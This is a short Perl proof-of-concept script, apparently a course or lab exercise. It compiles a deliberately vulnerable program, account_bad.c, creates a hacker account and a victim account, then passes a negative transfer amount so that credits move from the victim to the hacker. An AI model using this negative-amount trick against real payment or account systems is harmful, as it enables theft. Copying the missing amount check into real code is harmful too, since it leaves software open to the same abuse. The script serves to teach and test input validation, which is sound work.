#!/usr/bin/perl

#Issue 6: Exploit a
#Aim: To steal money from otherAccount by providing negative amount.

#To compile account_bad.c
system("gcc -g -o /vulnerable/account_bad /vulnerable/account_bad.c");

#Create a hacker account.
$ENV{USER} = 'hacker';
system("/vulnerable/account_bad hackerPassword");

#Create an account for otherAccount.
$ENV{USER} = 'otherAccount';
system("/vulnerable/account_bad otherAccountPass");

$ENV{USER} = 'hacker';
#steal from otherAccount's credits to hacker.
system("/vulnerable/account_bad hackerPassword -60 otherAccount");

$ENV{USER} = 'otherAccount';
#verify balance of credits for otherAccount.
print "#Below is balance of credits of otherAccount AFTER\n";
system("/vulnerable/account_bad otherAccountPass");